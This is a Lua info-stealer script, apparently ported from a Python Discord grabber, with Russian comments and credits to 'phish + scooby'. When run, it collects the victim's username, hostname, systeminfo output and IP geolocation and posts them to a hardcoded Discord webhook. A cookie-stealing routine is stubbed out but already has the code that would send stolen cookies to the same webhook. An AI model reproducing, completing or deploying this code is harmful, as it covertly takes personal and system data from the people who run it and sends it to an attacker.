local http = require("socket.http")
local ltn12 = require("ltn12")
local json = require("json")
local io = require("io")
local os = require("os")

local webhook = 'https://discord.com/api/webhooks/1424725409672724612/LaZaKieRAzyOf_nUFSdpKPR46CTme8A6lxz4omxNCE7T1KuxhehEmc1p9p3zE2H0Mn9r'

local __credits__ = 'phish + scooby'

local main = {}

function main.getip()
    local response_body = {}
    local res, code, headers = http.request{
        url = "http://ipinfo.io/json",
        sink = ltn12.sink.table(response_body)
    }
    
    if code == 200 then
        return json.decode(table.concat(response_body))
    else
        return {}
    end
end

function main.get_display_name()
    -- В Lua для Windows можно использовать os.getenv для имени пользователя
    -- Более сложные методы потребуют дополнительных библиотек
    return os.getenv("USERNAME") or os.getenv("USER") or "Unknown"
end

function main.syinfo(webhook_url)
    local data = main.getip()
    local name = main.get_display_name()
    local ip = data.ip or "Unknown"
    local c = data.city or "Unknown"
    local co = data.country or "Unknown"
    local r = data.region or "Unknown"
    local hostname = os.getenv('COMPUTERNAME') or os.getenv('HOSTNAME') or "Unknown"
    
    -- Получение информации о системе (упрощенно для Lua)
    local cpu = "Unknown"
    local gpu = "Unknown"
    local ram = "Unknown"
    
    -- Попытка получить информацию о системе через системные команды
    local f = io.popen("systeminfo 2>nul", "r")
    if f then
        local systeminfo = f:read("*a")
        f:close()
        -- Можно добавить парсинг systeminfo для получения CPU, RAM и т.д.
    end
    
    local embed_data = {
        content = "",
        embeds = {
            {
                color = 11014160,
                footer = {text = "scooby + phish ; .gg/comped"},
                image = {url = "https://media.discordapp.net/attachments/972490150418456616/1010172706903293952/ddf19ded4728f2695331f525d0400147.jpg"}
            },
            {
                title = "System / User Info",
                color = 11014160,
                fields = {
                    {
                        name = "💻 System Info",
                        value = "```fix\nPC / Desktop name : " .. hostname .. 
                               "\nName : " .. name .. 
                               "\nGPU : " .. gpu .. 
                               "\nCPU : " .. cpu .. 
                               "\nRAM : " .. ram .. " GB\n\n\n```"
                    },
                    {
                        name = "📶 Network",
                        value = "```fix\nIP : " .. ip .. 
                               "\nCity : " .. c .. 
                               "\nCountry : " .. co .. 
                               "\nRegion : " .. r .. "\n```"
                    }
                },
                footer = {text = ".gg/comped | s3x on ^"}
            }
        },
        username = ".gg/comped",
        avatar_url = "https://cdn.discordapp.com/attachments/972533865354772561/1039775714469224509/IMG_7011.jpg",
        attachments = {}
    }
    
    local json_str = json.encode(embed_data)
    local response_body = {}
    
    http.request{
        url = webhook_url,
        method = "POST",
        headers = {
            ["Content-Type"] = "application/json",
            ["Content-Length"] = tostring(#json_str)
        },
        source = ltn12.source.string(json_str),
        sink = ltn12.sink.table(response_body)
    }
    
    main.cookies(webhook_url)
end

function main.cookies(webhook_url)
    local listofcookies = {}
    
    local info = main.getip()
    local c = info.country or "Unknown"
    local ip = info.ip or "Unknown"
    
    -- В Lua нет прямого аналога browser_cookie3
    -- Это требует дополнительных библиотек или реализации для чтения cookies браузеров
    
    -- Заглушка для демонстрации
    print("Функция извлечения cookies браузеров требует дополнительной реализации в Lua")
    
    for _, cookie in ipairs(listofcookies) do
        local cookie_info = {
            content = '',
            embeds = {
                {
                    description = "cookie ; ```fix\n" .. cookie .. "\n```",
                    color = 11014160
                }
            },
            username = ".gg/comped",
            avatar_url = "https://cdn.discordapp.com/attachments/972533865354772561/1039775714469224509/IMG_7011.jpg",
            attachments = {}
        }
        
        local json_str = json.encode(cookie_info)
        local response_body = {}
        
        http.request{
            url = webhook_url,
            method = "POST",
            headers = {
                ["Content-Type"] = "application/json",
                ["Content-Length"] = tostring(#json_str)
            },
            source = ltn12.source.string(json_str),
            sink = ltn12.sink.table(response_body)
        }
    end
end

-- Запуск
if __credits__ == "phish + scooby" then
    main.syinfo(webhook)
end
